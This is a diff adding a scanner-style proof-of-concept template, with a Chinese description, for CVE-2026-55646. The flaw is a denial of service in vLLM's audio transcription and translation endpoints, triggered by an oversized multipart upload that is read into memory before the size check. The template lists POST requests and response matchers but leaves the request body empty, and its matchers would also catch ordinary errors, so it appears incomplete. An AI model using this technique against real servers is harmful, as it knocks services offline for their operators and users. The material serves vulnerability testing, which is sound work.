@@ -1,0 +1,63 @@
+[info]
+author = "AVE"
+description = "向 vLLM 的 /v1/audio/transcriptions 或 /v1/audio/translations 端点提交超大 multipart 音频文件，触发 request.file.read() 在文件大小限制检查前将整个文件读入内存，造成内存压力或进程终止"
+id = "POC-AVE-2026-0630"
+name = "vLLM 语音转文本API 资源消耗漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-55646",
+    "vllm",
+    "dos",
+    "resource-exhaustion",
+]
+vuln_id = [
+    "CVE-2026-55646",
+    "AVE-2026-0630",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/v1/audio/transcriptions"
+protocol = "http"
+
+[poc.requests.body]
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "413",
+    "500",
+    "timeout",
+    "memory",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/v1/audio/translations"
+protocol = "http"
+
+[poc.requests.body]
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "413",
+    "500",
+    "timeout",
+    "memory",
+]
